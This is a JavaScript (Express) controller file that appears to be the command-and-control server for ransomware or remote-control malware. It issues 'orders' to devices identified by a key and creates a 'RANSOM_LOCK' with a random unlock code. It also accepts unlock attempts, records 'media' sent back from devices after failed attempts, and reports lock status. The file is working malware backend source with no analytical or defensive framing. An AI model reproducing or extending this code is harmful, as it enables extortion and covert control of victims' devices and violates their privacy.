const Order = require("../Models/controlModel");
const Lock = require("../Models/lockModel");
const unlock_code = require("../funcations/genrate_lock_key")
exports.createOrder = async (req, res) => {
  try {
    const {key,order} = req.body;
    await Order.create({
      key,
      order,
      active:true
    });
    if (order === "RANSOM_LOCK"){
      const unlock_code_array = Math.random().toString(20).substr(2, 12).match(/.{1,4}/g)

      Lock.create({
        locked: true,
        key,
        code: unlock_code_array[0] + "-" + unlock_code_array[1] + "-" + unlock_code_array[2]
      });

    }


    res.sendStatus(200);
  } catch (error) {
    if (error) res.status(400).json({ status: "failed", error });
  }
};
exports.checkOrderStatus = async (req, res) => {
  try {
    const key = req.body.key;
    const order = await Order.findOne({ key: key, active: true });
    if (order) {
      res.status(200).json({
        status: "ok",
        order,
      });
    } else {
      res.status(200).json({
        status: "ok",
        order: null,
      });
    }
  } catch (error) {
    if (error) res.status(200).json({ status: "failed", error });
  }
};

exports.updateOrder = async (req, res) => {
  try {
    const { key, order, id, media } = req.body;
    const done = await Order.findOneAndUpdate(
      {
        key: key,
        order: order,
        _id: id,
        active: true,
      },
      { active: false, done: true, media: media },
      { new: true }
    );
    if (done) return res.status(200).json({ done });

    return res.sendStatus(400);
  } catch (error) {
    if (error) res.status(200).json({ status: "failed", error });
  }
};
exports.lock_the_sky = async (req, res) => {
  try {
    const { key, code, media } = req.body;
    const find_code = await Lock.findOne({ key: key, locked: true });
    const code_saved = find_code.code;
    if (code_saved !== null && code_saved === code) {
      await Lock.findOneAndUpdate(
        { key: key, locked: true },
        { locked: false },
        { new: true }
      );
      return res.sendStatus(200);
    }
    await Lock.findOneAndUpdate(
      { key: key, locked: true },
      { $push: { media: media } },
      { new: true }
    );
    return res.sendStatus(500);
  } catch (error) {
    console.log(error);

    if (error) res.status(200).json({ status: "failed", error });
  }
};
exports.check_if_locked = async (req, res) => {
  try {
    const { key } = req.body;
    const find_lock_status = await Lock.findOne({ key, locked: true });
    if (find_lock_status)
      return res.status(200).json({
        status: "ok",
        locked: true,
      });
    return res.status(200).json({
      status: "ok",
      locked: false,
    });
  } catch (e) {
    console.log(e);
  }
};
